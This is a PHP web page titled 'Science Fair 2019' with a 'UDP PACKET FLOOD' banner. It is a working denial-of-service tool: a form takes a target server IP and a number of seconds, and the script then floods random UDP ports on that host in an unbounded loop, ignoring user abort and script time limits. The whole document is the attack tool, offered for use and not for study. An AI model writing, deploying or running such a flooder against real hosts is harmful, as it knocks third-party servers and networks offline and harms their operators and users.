<html>
<head>
Science Fair 2019 - Script by: RevokedCookie
<?php
$ip = $_SERVER['REMOTE_ADDR'];
?>
<style>
        .yeet {
                margin-top: -60px;
        }
</style>
</head>
<body>
<center>
<font color="green">
<pre>
██╗   ██╗██████╗ ██████╗     ██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗    ███████╗██╗      ██████╗  ██████╗ ██████╗ 
██║   ██║██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝╚══██╔══╝    ██╔════╝██║     ██╔═══██╗██╔═══██╗██╔══██╗
██║   ██║██║  ██║██████╔╝    ██████╔╝███████║██║     █████╔╝ █████╗     ██║       █████╗  ██║     ██║   ██║██║   ██║██║  ██║
██║   ██║██║  ██║██╔═══╝     ██╔═══╝ ██╔══██║██║     ██╔═██╗ ██╔══╝     ██║       ██╔══╝  ██║     ██║   ██║██║   ██║██║  ██║
╚██████╔╝██████╔╝██║         ██║     ██║  ██║╚██████╗██║  ██╗███████╗   ██║       ██║     ███████╗╚██████╔╝╚██████╔╝██████╔╝
 ╚═════╝ ╚═════╝ ╚═╝         ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚═╝     ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ 
 ███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
 </pre>
 <STYLE>
input{
background-color: black; font-size: 17pt; color: white; font-family: Tahoma; border: 1 solid #666666;
}
button{
background-color: #00FF00; font-size: 20pt; color: #000000; font-family: Tahoma; border: 1 solid #666666;
}
body {
background-color: #000000;
}
</style>
<center><font color="blue" size="20"><b><?php echo $ip; ?></b></font></center>
<center><font color="grey" size="5"> <b>- - - - - - - - - - - - - - - - - - - -</b></font></center>
<?php
if(isset($_GET['ip'])&&isset($_GET['secs'])){
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    
    $exec_time = $_GET['secs'];
    
    $time = time();
    $max_time = $time+$exec_time;
    $host = $_GET['ip'];
    
    for($i=0;$i<65000;$i++){
            $out = 'X';
    }
    while(1){
    $packets++;
            if(time() > $max_time){
                    break;
            }
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
            if($fp){
                    fwrite($fp, $out);
                    fclose($fp);
            }
    }
    echo "<font size=4><br><b></b><br>Sent $packets packets to  $ip at ". round($packets/$exec_time, 2) . " packets a second for $exec_time seconds.\n";
    echo '<br><br>
    <input type="hidden" name="act" value="php" required>
    <font color="blue" size=4><b>Server IP: </b><br><input  class="textbox" type=text name=ip required><br>Seconds: <br><input type=text name=secs required><br><input type=submit value=SEND_PACKETS required></form>
    
    ';
}else{ echo '<br><b></b><br>
        <form action=? method=GET>
        <input type="hidden" name="act" value="php" required>
        <font color="blue" size=4><b>SERVER_IP: <div></div></b><br><input type=text name=ip value="" required>
        <br>
    <font color="blue" size=4><br><b>SECONDS: <div></div></b><br><input type=text name=secs value="" required><br><br>
    <font color="blue"><input class="textbox" type=submit value="SEND_PACKETS" required></form>';
}
?>
</center>
</body>
</html>
